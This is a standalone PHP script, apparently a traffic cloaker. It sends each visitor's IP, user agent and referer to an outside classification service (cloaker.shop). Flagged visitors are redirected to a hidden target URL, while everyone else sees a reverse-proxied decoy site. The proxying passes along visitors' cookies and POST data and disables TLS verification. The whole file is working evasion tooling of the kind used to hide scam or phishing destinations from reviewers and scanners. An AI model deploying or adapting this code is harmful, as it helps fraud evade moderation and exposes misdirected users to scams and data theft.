<?php
ob_start();
$target = getenv("target_url");
$key = getenv("clocker_api_key");

function url_get_contents ($Url,$key) {
    if (!function_exists('curl_init')){ 
        die('CURL is not installed!');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
        'key'=>$key,
        'ref' => @$_SERVER['HTTP_REFERER'],
        'useragent'=> @$_SERVER['HTTP_USER_AGENT'],
        'ip'=>getIpAddress()
    )));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
function getIpAddress()
{
    if (getenv("HTTP_CLIENT_IP")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")) {
            $ip = getenv("HTTP_X_FORWARDED_FOR");
            if (strstr($ip, ",")) {
                $tmp = explode(",", $ip);
                $ip = trim($tmp[0]);
            }
        } else {
            $ip = getenv("REMOTE_ADDR");
        }
    }
    return $ip;
}
$data = url_get_contents("https://cloaker.shop",$key);
$json = json_decode($data,true);

if($json['status'] == 1){
    header("Location: ".$target);
    exit();
}

$kokdomain=getenv("fake_url");
$asildomain='www.'.$kokdomain;
$bizimdomain= $_SERVER['HTTP_HOST']; 
$domainfiltreleme=(bool)1; 
$domain=isset($_SERVER['HTTPS'])?'https':'http'.'://'.$asildomain; 
error_reporting(0); 
set_time_limit(0); 
$safcookie=''; foreach($_COOKIE as $k => $v){ $safcookie.="$k=$v; "; } 
$ch = curl_init($domain.$_SERVER['REQUEST_URI']);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION , 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_HEADER , 1); 
curl_setopt($ch, CURLOPT_COOKIE , $safcookie); 
#curl_setopt($ch, CURLOPT_PROXY , "127.0.0.1:8888"); 
if(str_replace($bizimdomain,$asildomain,$_SERVER['HTTP_REFERER'])) { curl_setopt($ch, CURLOPT_REFERER ,str_replace($bizimdomain,$asildomain,$_SERVER['HTTP_REFERER'])); } 
curl_setopt($ch,CURLOPT_ENCODING , ""); 
if ($_SERVER['REQUEST_METHOD'] == 'POST') { 
curl_setopt_array($ch, array(CURLOPT_POST => 1,CURLOPT_POSTFIELDS => @file_get_contents('php://input'))); 
} 
$e=curl_exec($ch); 
$info=curl_getinfo($ch); 
if($info['http_code']!='200' && $info['http_code']!='301' && $info['http_code']!='302'){header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");exit;} 
//$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE); 
$header = substr($e, 0, $info['header_size']); 
$body = substr($e, $info['header_size']); 
if(stristr($header,'HTTP/1.1 301') || stristr($header,'HTTP/1.1 302')) 
{ 
#header("Location: ".str_replace($asildomain,$bizimdomain,$info['url'])); 
#exit; 
} 
foreach(explode("\n",$header) as $v) 
{ 
if(!stristr(strtolower(current(explode(':',$v))),'encoding') && !stristr(strtolower(current(explode(':',$v))),'length')){ 
    #header(str_replace($kokdomain,$bizimdomain,$v),0); 
    } 
} 
echo $domainfiltreleme?str_replace($asildomain,$bizimdomain,$body):$body; 

ob_end_flush();


?>

